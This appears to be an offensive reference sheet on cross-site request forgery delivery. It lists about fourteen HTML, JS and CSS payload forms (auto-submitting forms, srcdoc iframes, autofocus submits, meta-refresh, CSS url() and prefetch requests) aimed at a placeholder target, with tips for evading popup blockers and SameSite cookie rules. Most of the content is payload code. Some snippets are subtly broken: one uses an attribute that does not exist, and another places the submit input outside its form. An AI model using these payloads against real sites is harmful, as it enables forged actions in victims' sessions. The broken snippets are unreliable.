# Delivery edge cases — the corner carriers and their traps

The delivery shapes that almost work, the ones that look right but
don't fire, and the corner carriers that do.

---

## 1. The popup-blocked window.open

```js
window.open('https://t/x?a=1')   // blocked by the popup-blocker
                                 // when not user-initiated
```

`window.open` from a script (no user gesture) gets popup-blocked —
the nav doesn't happen. A `location=` assignment or a form submit
isn't popup-gated. For a top-nav write, `location=` is the reliable
carrier, not `window.open`.

## 2. The form-inside-a-`noscript` trap

```html
<noscript><form action="https://t/x" method=POST>...</form></noscript>
```

A `noscript` block only renders when JS is OFF — a bot that runs JS
never sees the form. Use it only for a no-JS bot (rare).

## 3. The `srcdoc` iframe — a nested auto-fire

```html
<iframe srcdoc='<form action="https://t/x" method=POST>
<input name=a value=1></form>
<script>document.forms[0].submit()<\/script>'></iframe>
```

The `srcdoc` iframe is same-origin to its PARENT — a page that runs
in the target's context can nest a CSRF. The `</script>` inside
`srcdoc` needs `<\/script>` escaping.

## 4. The `target="_blank"` form — a new-tab write

```html
<form target=_blank action="https://t/x" method=POST>
  <input name=a value=1></form>
<script>document.forms[0].submit()</script>
```

`_blank` opens a new tab — a popup-blocker may block it too. An
iframe-target is more reliable than `_blank`.

## 5. The `form` + `formaction` on a button — the override

```html
<button formaction="https://t/x" formmethod=POST formaction-override>
  click</button>
```

A button's `formaction`/`formmethod`/`formenctype` overrides the
form's — a click submits to the button's target. Still needs a
click — a social hook or an autofocus trick.

## 6. The `autofocus`+`onfocus` click-free submit

```html
<input type=submit autofocus onfocus="this.form.submit()">
<form action="https://t/x" method=POST><input name=a value=1></form>
```

`autofocus` triggers `onfocus` on load — fires the submit without a
click. Works when the input can take focus.

## 7. The `history`-navigation re-fire

```js
history.pushState(null,'','/x');location.reload();
```

Same-origin only — not a CSRF carrier; a same-origin reload trick.

## 8. The `Link` header / prefetch — a passive fire

```html
<link rel=prefetch href="https://t/x?a=1">
<link rel=preconnect href="https://t/x">
<link rel=dns-prefetch href="//t">
```

`prefetch`/`preload`/`dns-prefetch` fire a GET for the resource —
sub-resource, SameSite-gated, GET-only.

## 9. The CSS/url() carrier

```css
body{background:url('https://t/x?a=1')}
div{list-style:url('https://t/x?a=1')}
@import url('https://t/x?a=1');
```

A CSS `url()` fires a GET for the image — sub-resource, GET-only,
SameSite-gated. A stored-CSS context's carrier.

## 10. The `refresh` inside a response — a meta-refresh nav

```html
<meta http-equiv=refresh content="0;url=https://t/x?a=1">
```

A meta-refresh is a top-level nav — Lax attaches. The reliable
no-JS top-nav.

## 11. The `javascript:` pseudo-scheme — a nav that runs JS

```html
<a href="javascript:document.forms[0].submit()">x</a>
<iframe src="javascript:...">
```

A `javascript:` URL needs a click or an iframe — and may send
`Origin: null`. The opaque-origin bypass carrier.

## 12. The `window.name` pre-fill — a cross-page channel

```js
window.name='<form action="https://t/x">...';   // a value that
                                               // survives a nav —
                                               // the landing page
                                               // can read it
```

`window.name` persists across same-tab navigations — a channel to
pass data to a later page, not a request itself.

## 13. The `ServiceWorker`/cache — a stored-middleware CSRF

```text
a stored ServiceWorker or a cached page that intercepts the next
visit's requests — a persistent CSRF that fires on every load. rare,
needs sw-installation.
```

## 14. The `import()`/`require` dynamic — a JS-carrier

```js
import('https://t/x.js')   // a module load — GET, sub-resource
new Function('fetch("https://t/x")')   // a fetch — needs CORS for read
```

## 15. The corner-carrier decision table

| The trap | The working carrier |
|---|---|
| window.open popup-blocked | location= or a form nav |
| no-JS context | a meta-refresh or a pure-HTML form+click |
| iframe-needed for sequencing | a named iframe target + onload |
| a new-tab needed | _blank is blockable — an iframe is safer |
| a button-override | needs a click — a social hook |
| a passive prefetch | GET-only, sub-resource |
| a stored-CSS context | a url() GET |
| an opaque-origin | a data:/javascript: carrier |
